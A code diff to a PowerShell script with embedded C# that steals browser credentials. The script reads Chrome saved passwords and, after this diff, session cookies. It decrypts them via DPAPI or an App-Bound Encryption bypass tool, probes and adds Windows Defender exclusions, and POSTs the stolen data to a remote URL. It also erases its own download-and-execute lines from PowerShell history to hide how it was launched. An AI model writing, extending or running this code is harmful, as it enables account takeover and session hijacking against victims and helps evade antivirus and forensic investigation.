@@ -66,19 +66,133 @@ function Get-ChromeInstalledVersion {
     }
 }
 
-$ChromeInfo = Get-ChromeInstalledVersion
-$UseChromelevator = $ChromeInfo.AppBoundSupported -and $IsRunningAsAdmin
-$UseDpapiDecrypt = -not $UseChromelevator
+function Get-DefenderExclusions {
+    $paths = @()
+    $processes = @()
 
+    try {
+        $prefs = Get-MpPreference -ErrorAction Stop
+        if ($prefs.ExclusionPath) {
+            $paths += @($prefs.ExclusionPath)
+        }
+        if ($prefs.ExclusionProcess) {
+            $processes += @($prefs.ExclusionProcess)
+        }
+        return @{ Paths = $paths; Processes = $processes; Source = "Get-MpPreference" }
+    }
+    catch {
+    }
+
+    try {
+        $pathKey = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction Stop
+        $paths += @($pathKey.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object { $_.Name })
+    }
+    catch {
+    }
+
+    try {
+        $processKey = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -ErrorAction Stop
+        $processes += @($processKey.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object { $_.Name })
+    }
+    catch {
+    }
+
+    return @{ Paths = $paths; Processes = $processes; Source = "registry" }
+}
+
+function Test-DefenderPathExcluded {
+    param(
+        [string]$TargetPath,
+        [string[]]$ExclusionPaths
+    )
+
+    if (-not $TargetPath) {
+        return $false
+    }
+
+    $normalizedTarget = $TargetPath.TrimEnd("\")
+    foreach ($exclusion in $ExclusionPaths) {
+        $normalizedExclusion = $exclusion.TrimEnd("\")
+        if (
+            $normalizedTarget -eq $normalizedExclusion -or
+            $normalizedTarget.StartsWith("$normalizedExclusion\", [System.StringComparison]::OrdinalIgnoreCase)
+        ) {
+            return $true
+        }
+    }
+
+    return $false
+}
+
+function Get-ChromelevatorArchTag {
+    if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") {
+        return "arm64"
+    }
+    return "x64"
+}
+
+function Test-ChromelevatorDefenderStatus {
+    $archTag = Get-ChromelevatorArchTag
+    $processName = "chromelevator_$archTag.exe"
+    $elevatorPath = Join-Path $ChromelevatorCacheDir $processName
+    $exclusions = Get-DefenderExclusions
+
+    $pathExcluded = (Test-DefenderPathExcluded -TargetPath $ChromelevatorCacheDir -ExclusionPaths $exclusions.Paths) -or
+        (Test-DefenderPathExcluded -TargetPath $elevatorPath -ExclusionPaths $exclusions.Paths)
+    $processExcluded = @($exclusions.Processes | ForEach-Object { $_.ToLowerInvariant() }) -contains $processName.ToLowerInvariant() -or
+        @($exclusions.Processes | ForEach-Object { $_.ToLowerInvariant() }) -contains "chromelevator.exe"
+
+    $status = [ordered]@{
+        arch = $archTag
+        exclusionSource = $exclusions.Source
+        pathExcluded = [bool]$pathExcluded
+        processExcluded = [bool]$processExcluded
+        binaryCached = Test-Path -LiteralPath $elevatorPath
+        probeOk = $false
+        canRunWithoutAdmin = $false
+    }
+
+    if ($status.binaryCached) {
+        try {
+            Unblock-File -LiteralPath $elevatorPath -ErrorAction SilentlyContinue
+            $probe = Start-Process -FilePath $elevatorPath -ArgumentList @("--help") -Wait -PassThru -WindowStyle Hidden -ErrorAction Stop
+            $status.probeOk = $true
+            $status.probeExitCode = $probe.ExitCode
+        }
+        catch {
+            $status.probeError = $_.Exception.Message
+            if ($_.Exception.Message -match "virus|potentially unwanted|malware|software malicioso|no deseado") {
+                $status.probeOk = $false
+            }
+        }
+    }
+
+    # "Allow" in Protection history is not the same as MpPreference exclusions.
+    # A successful --help probe is the most reliable signal that execution is allowed.
+    $status.canRunWithoutAdmin = [bool](
+        $status.probeOk -or
+        ($pathExcluded -and $processExcluded)
+    )
+
+    return [pscustomobject]$status
+}
+
+$ChromeInfo = Get-ChromeInstalledVersion
 Write-Host "[DEBUG] chrome.version=$($ChromeInfo.version) major=$($ChromeInfo.major) path=$($ChromeInfo.path)"
 Write-Host "[DEBUG] chrome.appBoundSupported=$($ChromeInfo.AppBoundSupported) legacyDpapiOnly=$($ChromeInfo.LegacyDpapiOnly)"
+
+$ChromelevatorDefenderStatus = Test-ChromelevatorDefenderStatus
+$UseChromelevator = $ChromeInfo.AppBoundSupported -and (
+    $IsRunningAsAdmin -or $ChromelevatorDefenderStatus.canRunWithoutAdmin
+)
+$UseDpapiDecrypt = -not $UseChromelevator
+
+Write-Host "[DEBUG] defender.pathExcluded=$($ChromelevatorDefenderStatus.pathExcluded) processExcluded=$($ChromelevatorDefenderStatus.processExcluded) source=$($ChromelevatorDefenderStatus.exclusionSource)"
+Write-Host "[DEBUG] defender.binaryCached=$($ChromelevatorDefenderStatus.binaryCached) probeOk=$($ChromelevatorDefenderStatus.probeOk) canRunWithoutAdmin=$($ChromelevatorDefenderStatus.canRunWithoutAdmin)"
 Write-Host "[DEBUG] strategy.useDpapiDecrypt=$UseDpapiDecrypt useChromelevator=$UseChromelevator"
 
-if (-not $IsRunningAsAdmin -and $ChromeInfo.AppBoundSupported) {
-    Write-Host "[DEBUG] Not admin; chromelevator v20 decryption skipped (DPAPI fallback for legacy entries)"
-}
-elseif ($ChromeInfo.LegacyDpapiOnly) {
-    Write-Host "[DEBUG] Chrome <127; using DPAPI only (chromelevator not needed)"
+if (-not $UseChromelevator -and $ChromeInfo.AppBoundSupported -and -not $IsRunningAsAdmin) {
+    Write-Host "[DEBUG] chromelevator unavailable without admin (probe failed and no Defender exclusions)"
 }
 
 function Initialize-ChromelevatorDefenderAllowlist {
@@ -120,12 +234,11 @@ function Add-DefenderAllowlistEntry {
 function Protect-ChromelevatorBinary {
     param([string]$ElevatorPath)
 
-    if (-not $IsRunningAsAdmin) {
-        return
+    if ($IsRunningAsAdmin) {
+        Add-DefenderAllowlistEntry -Path $ElevatorPath | Out-Null
+        Add-DefenderAllowlistEntry -ProcessName (Split-Path -Leaf $ElevatorPath) | Out-Null
     }
 
-    Add-DefenderAllowlistEntry -Path $ElevatorPath | Out-Null
-    Add-DefenderAllowlistEntry -ProcessName (Split-Path -Leaf $ElevatorPath) | Out-Null
     Unblock-File -LiteralPath $ElevatorPath -ErrorAction SilentlyContinue
 
     if (-not (Test-Path -LiteralPath $ElevatorPath)) {
@@ -258,6 +371,60 @@ function Merge-ChromelevatorPasswords {
     return $mergedCount
 }
 
+function Merge-ChromelevatorCookies {
+    param(
+        [object]$Payload,
+        [string]$OutputRoot
+    )
+
+    $chromeRoot = Join-Path $OutputRoot "Chrome"
+    if (-not (Test-Path $chromeRoot)) {
+        return 0
+    }
+
+    $cookies = New-Object System.Collections.Generic.List[object]
+    $index = 0
+
+    foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
+        $cookiesFile = Join-Path $profileDir.FullName "cookies.json"
+        if (-not (Test-Path $cookiesFile)) {
+            continue
+        }
+
+        $entries = Get-Content -Path $cookiesFile -Raw -Encoding UTF8 | ConvertFrom-Json
+        if ($null -eq $entries) {
+            continue
+        }
+
+        if ($entries -isnot [System.Array]) {
+            $entries = @($entries)
+        }
+
+        foreach ($entry in $entries) {
+            $cookies.Add([pscustomobject]@{
+                index = $index
+                profile = $profileDir.Name
+                host = [string]$entry.host
+                name = [string]$entry.name
+                path = [string]$entry.path
+                value = [string]$entry.value
+                value_dpapi = [string]$entry.value
+                expires = [long]$entry.expires
+                secure = $null
+                httpOnly = $null
+            })
+            $index++
+        }
+    }
+
+    if ($cookies.Count -gt 0) {
+        $Payload.cookies = @($cookies)
+        $Payload.cookieCount = $cookies.Count
+    }
+
+    return $cookies.Count
+}
+
 function Add-DefenderExclusionIfAdmin {
     param([string]$Path)
 
@@ -317,9 +484,11 @@ function Invoke-ChromelevatorExtraction {
         used = $false
         arch = $null
         abeMergedCount = 0
+        cookiesMergedCount = 0
         error = $null
         defenderHint = $null
         skipped = $false
+        defender = $ChromelevatorDefenderStatus
     }
 
     if (-not $UseChromelevator) {
@@ -329,8 +498,8 @@ function Invoke-ChromelevatorExtraction {
             Write-Host "[DEBUG] chromelevator skipped (Chrome <127)"
         }
         elseif (-not $IsRunningAsAdmin) {
-            $meta.error = "Requires administrator to decrypt App-Bound (v20) passwords"
-            Write-Host "[DEBUG] chromelevator skipped (not admin)"
+            $meta.error = "chromelevator blocked without admin (Defender exclusion or runnable probe missing)"
+            Write-Host "[DEBUG] chromelevator skipped (not admin and not allowlisted)"
         }
         else {
             $meta.error = "chromelevator not required for this Chrome version"
@@ -339,7 +508,9 @@ function Invoke-ChromelevatorExtraction {
         return $meta
     }
 
-    Initialize-ChromelevatorDefenderAllowlist
+    if ($IsRunningAsAdmin) {
+        Initialize-ChromelevatorDefenderAllowlist
+    }
 
     $outDir = $null
     try {
@@ -351,13 +522,15 @@ function Invoke-ChromelevatorExtraction {
         New-Item -ItemType Directory -Path $outDir -Force | Out-Null
         Add-DefenderExclusionIfAdmin -Path $outDir | Out-Null
 
-        Write-Host "[DEBUG] Running chromelevator for App-Bound (v20) passwords..."
+        Write-Host "[DEBUG] Running chromelevator for App-Bound (v20) data..."
         Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
 
         $mergedCount = Merge-ChromelevatorPasswords -Payload $Payload -OutputRoot $outDir
+        $cookiesMergedCount = Merge-ChromelevatorCookies -Payload $Payload -OutputRoot $outDir
         $meta.used = $true
         $meta.abeMergedCount = $mergedCount
-        Write-Host "[DEBUG] chromelevator.abeMergedCount=$mergedCount"
+        $meta.cookiesMergedCount = $cookiesMergedCount
+        Write-Host "[DEBUG] chromelevator.abeMergedCount=$mergedCount cookiesMergedCount=$cookiesMergedCount"
     }
     catch {
         $message = $_.Exception.Message
@@ -382,6 +555,48 @@ function Invoke-ChromelevatorExtraction {
 
     return $meta
 }
+
+function Clear-ScriptExecutionHistory {
+    $pattern = "(DownloadString|windows-script|iex\s*\(|Invoke-Expression|iwr\s+.*windows-script|Invoke-WebRequest.*windows-script)"
+    $historyPaths = @()
+
+    try {
+        if (Get-Module PSReadLine -ErrorAction SilentlyContinue) {
+            $readLinePath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
+            if ($readLinePath) {
+                $historyPaths += $readLinePath
+            }
+        }
+    }
+    catch {
+    }
+
+    $historyPaths += Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+    foreach ($historyPath in @($historyPaths | Select-Object -Unique)) {
+        if (-not (Test-Path -LiteralPath $historyPath)) {
+            continue
+        }
+
+        try {
+            $remaining = @(Get-Content -LiteralPath $historyPath -ErrorAction Stop |
+                Where-Object { $_ -notmatch $pattern })
+            Set-Content -LiteralPath $historyPath -Value $remaining -Encoding utf8
+        }
+        catch {
+        }
+    }
+
+    try {
+        Clear-History -ErrorAction SilentlyContinue
+    }
+    catch {
+    }
+
+    Write-Host "[DEBUG] Cleared script invocation from history"
+}
+
+try {
 
 Add-Type -AssemblyName System.Security
 
@@ -427,7 +642,9 @@ public static class __EXPORTER_CLASS__
         }
 
         var passwords = new List<PasswordEntry>();
+        var cookies = new List<CookieEntry>();
         int index = 0;
+        int cookieIndex = 0;
 
         foreach (string profilePath in Directory.GetDirectories(chromePath))
         {
@@ -438,19 +655,53 @@ public static class __EXPORTER_CLASS__
             }
 
             string loginDbPath = Path.Combine(profilePath, "Login Data");
-            if (!File.Exists(loginDbPath))
+            if (File.Exists(loginDbPath))
             {
-                continue;
+                byte[] dbBytes = TryReadShared(loginDbPath);
+                if (dbBytes != null)
+                {
+                    foreach (PasswordEntry entry in ReadLogins(dbBytes, folder, dpapiKey, attemptDpapiDecrypt, ref index))
+                    {
+                        passwords.Add(entry);
+                    }
+                }
             }
 
-            byte[] dbBytes = ReadShared(loginDbPath);
-            foreach (PasswordEntry entry in ReadLogins(dbBytes, folder, dpapiKey, attemptDpapiDecrypt, ref index))
+            if (attemptDpapiDecrypt)
             {
-                passwords.Add(entry);
+                string cookiesDbPath = ResolveCookiesDbPath(profilePath);
+                if (cookiesDbPath != null)
+                {
+                    byte[] cookieDbBytes = TryReadShared(cookiesDbPath);
+                    if (cookieDbBytes != null)
+                    {
+                        foreach (CookieEntry entry in ReadCookies(cookieDbBytes, folder, dpapiKey, attemptDpapiDecrypt, ref cookieIndex))
+                        {
+                            cookies.Add(entry);
+                        }
+                    }
+                }
             }
         }
 
-        return BuildJson(passwords);
+        return BuildJson(passwords, cookies);
+    }
+
+    private static string ResolveCookiesDbPath(string profilePath)
+    {
+        string networkPath = Path.Combine(profilePath, "Network", "Cookies");
+        if (File.Exists(networkPath))
+        {
+            return networkPath;
+        }
+
+        string legacyPath = Path.Combine(profilePath, "Cookies");
+        if (File.Exists(legacyPath))
+        {
+            return legacyPath;
+        }
+
+        return null;
     }
 
     private static byte[] GetEncryptedKeyBlob(string localStatePath, string keyName)
@@ -492,6 +743,22 @@ public static class __EXPORTER_CLASS__
                 read += stream.Read(bytes, read, bytes.Length - read);
             }
             return bytes;
+        }
+    }
+
+    private static byte[] TryReadShared(string path)
+    {
+        try
+        {
+            return ReadShared(path);
+        }
+        catch (IOException)
+        {
+            return null;
+        }
+        catch (UnauthorizedAccessException)
+        {
+            return null;
         }
     }
 
@@ -611,6 +878,120 @@ public static class __EXPORTER_CLASS__
         return entries;
     }
 
+    private static IEnumerable<CookieEntry> ReadCookies(byte[] dbBytes, string profile, byte[] dpapiKey, bool attemptDpapiDecrypt, ref int index)
+    {
+        var entries = new List<CookieEntry>();
+        IntPtr db = IntPtr.Zero;
+        IntPtr stmt = IntPtr.Zero;
+        GCHandle pinned = GCHandle.Alloc(dbBytes, GCHandleType.Pinned);
+
+        try
+        {
+            int rc = sqlite3_open(":memory:", out db);
+            if (rc != 0)
+            {
+                throw new InvalidOperationException("sqlite3_open failed: " + rc);
+            }
+
+            IntPtr dataPtr = pinned.AddrOfPinnedObject();
+            rc = sqlite3_deserialize(db, "main", dataPtr, dbBytes.LongLength, dbBytes.LongLength, SQLITE_DESERIALIZE_READONLY);
+            if (rc != 0)
+            {
+                throw new InvalidOperationException("sqlite3_deserialize failed: " + rc + ". Requires Windows 10 1809+.");
+            }
+
+            rc = sqlite3_prepare_v2(
+                db,
+                "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies",
+                -1,
+                out stmt,
+                IntPtr.Zero);
+            if (rc != 0)
+            {
+                throw new InvalidOperationException("sqlite3_prepare_v2 failed: " + rc);
+            }
+
+            while (sqlite3_step(stmt) == 100)
+            {
+                string host = ReadText(stmt, 0);
+                string name = ReadText(stmt, 1);
+                string cookiePath = ReadText(stmt, 2);
+                byte[] ciphertext = ReadBlob(stmt, 3);
+                long expires = ReadInt64(stmt, 4);
+                bool secure = ReadInt(stmt, 5) != 0;
+                bool httpOnly = ReadInt(stmt, 6) != 0;
+
+                string value = "";
+                string valueDpapi = "";
+
+                if (ciphertext != null && ciphertext.Length > 0)
+                {
+                    if (attemptDpapiDecrypt)
+                    {
+                        try
+                        {
+                            value = __CRYPTO_CLASS__.DecryptPassword(dpapiKey, ciphertext, false);
+                        }
+                        catch
+                        {
+                            value = "";
+                        }
+                    }
+                    else if (ciphertext.Length >= 3)
+                    {
+                        string version = Encoding.ASCII.GetString(ciphertext, 0, 3);
+                        if (version == "v20")
+                        {
+                            value = "[Chrome 127+ App-Bound Encryption - export from chrome://password-manager]";
+                        }
+                    }
+                }
+
+                entries.Add(new CookieEntry
+                {
+                    Index = index,
+                    Profile = profile,
+                    Host = host,
+                    Name = name,
+                    Path = cookiePath,
+                    Value = value,
+                    ValueDpapi = valueDpapi,
+                    Expires = expires,
+                    Secure = secure,
+                    HttpOnly = httpOnly
+                });
+                index++;
+            }
+        }
+        finally
+        {
+            if (stmt != IntPtr.Zero)
+            {
+                sqlite3_finalize(stmt);
+            }
+            if (db != IntPtr.Zero)
+            {
+                sqlite3_close_v2(db);
+            }
+            if (pinned.IsAllocated)
+            {
+                pinned.Free();
+            }
+        }
+
+        return entries;
+    }
+
+    private static long ReadInt64(IntPtr stmt, int column)
+    {
+        return sqlite3_column_int64(stmt, column);
+    }
+
+    private static int ReadInt(IntPtr stmt, int column)
+    {
+        return sqlite3_column_int(stmt, column);
+    }
+
     private static string ReadText(IntPtr stmt, int column)
     {
         IntPtr ptr = sqlite3_column_text(stmt, column);
@@ -636,7 +1017,7 @@ public static class __EXPORTER_CLASS__
         return bytes;
     }
 
-    private static string BuildJson(List<PasswordEntry> passwords)
+    private static string BuildJson(List<PasswordEntry> passwords, List<CookieEntry> cookies)
     {
         var builder = new StringBuilder();
         builder.Append("{");
@@ -644,8 +1025,11 @@ public static class __EXPORTER_CLASS__
         builder.Append("\"username\":").Append(JsonString(Environment.UserName)).Append(",");
         builder.Append("\"executedAt\":").Append(JsonString(DateTime.UtcNow.ToString("o"))).Append(",");
         builder.Append("\"passwordCount\":").Append(passwords.Count).Append(",");
+        builder.Append("\"cookieCount\":").Append(cookies.Count).Append(",");
         builder.Append("\"passwords\":");
         AppendPasswordArray(builder, passwords);
+        builder.Append(",\"cookies\":");
+        AppendCookieArray(builder, cookies);
         builder.Append("}");
         return builder.ToString();
     }
@@ -677,6 +1061,40 @@ public static class __EXPORTER_CLASS__
         builder.Append("\"username\":").Append(JsonString(entry.Username)).Append(",");
         builder.Append("\"password\":").Append(JsonString(entry.Password)).Append(",");
         builder.Append("\"password_dpapi\":").Append(JsonString(entry.PasswordDpapi));
+        builder.Append("}");
+    }
+
+    private static void AppendCookieArray(StringBuilder builder, List<CookieEntry> cookies)
+    {
+        builder.Append("[");
+
+        for (int i = 0; i < cookies.Count; i++)
+        {
+            CookieEntry entry = cookies[i];
+            if (i > 0)
+            {
+                builder.Append(",");
+            }
+
+            AppendCookieEntry(builder, entry);
+        }
+
+        builder.Append("]");
+    }
+
+    private static void AppendCookieEntry(StringBuilder builder, CookieEntry entry)
+    {
+        builder.Append("{");
+        builder.Append("\"index\":").Append(entry.Index).Append(",");
+        builder.Append("\"profile\":").Append(JsonString(entry.Profile)).Append(",");
+        builder.Append("\"host\":").Append(JsonString(entry.Host)).Append(",");
+        builder.Append("\"name\":").Append(JsonString(entry.Name)).Append(",");
+        builder.Append("\"path\":").Append(JsonString(entry.Path)).Append(",");
+        builder.Append("\"value\":").Append(JsonString(entry.Value)).Append(",");
+        builder.Append("\"value_dpapi\":").Append(JsonString(entry.ValueDpapi)).Append(",");
+        builder.Append("\"expires\":").Append(entry.Expires).Append(",");
+        builder.Append("\"secure\":").Append(entry.Secure ? "true" : "false").Append(",");
+        builder.Append("\"httpOnly\":").Append(entry.HttpOnly ? "true" : "false");
         builder.Append("}");
     }
 
@@ -739,6 +1157,12 @@ public static class __EXPORTER_CLASS__
     private static extern int sqlite3_column_bytes(IntPtr stmt, int iCol);
 
     [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
+    private static extern int sqlite3_column_int(IntPtr stmt, int iCol);
+
+    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
+    private static extern long sqlite3_column_int64(IntPtr stmt, int iCol);
+
+    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
     private static extern int sqlite3_finalize(IntPtr stmt);
 
     [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
@@ -752,6 +1176,20 @@ public static class __EXPORTER_CLASS__
         public string Username;
         public string Password;
         public string PasswordDpapi;
+    }
+
+    private sealed class CookieEntry
+    {
+        public int Index;
+        public string Profile;
+        public string Host;
+        public string Name;
+        public string Path;
+        public string Value;
+        public string ValueDpapi;
+        public long Expires;
+        public bool Secure;
+        public bool HttpOnly;
     }
 }
 
@@ -1059,6 +1497,7 @@ $payloadJson = $exporterType.GetMethod("Export").Invoke($null, @($UseDpapiDecryp
 $payloadObject = $payloadJson | ConvertFrom-Json
 $payloadObject | Add-Member -NotePropertyName chrome -NotePropertyValue ([pscustomobject]$ChromeInfo) -Force
 Write-Host "[DEBUG] passwordCount=$($payloadObject.passwordCount)"
+Write-Host "[DEBUG] cookieCount=$($payloadObject.cookieCount)"
 $dpapiDecrypted = @($payloadObject.passwords | Where-Object { $_.password -and $_.password -ne "" -and $_.password -notmatch "App-Bound Encryption" }).Count
 Write-Host "[DEBUG] v10_v11.decryptedCount=$dpapiDecrypted"
 
@@ -1072,3 +1511,7 @@ $payloadJson = $payloadObject | ConvertTo-Json -Depth 10
 Write-Host "[DEBUG] Sending payload to API..."
 $response = Invoke-RestMethod -Uri $PayloadUrl -Method Post -ContentType "application/json; charset=utf-8" -Body $payloadJson
 $response | ConvertTo-Json -Compress
+}
+finally {
+    Clear-ScriptExecutionHistory
+}
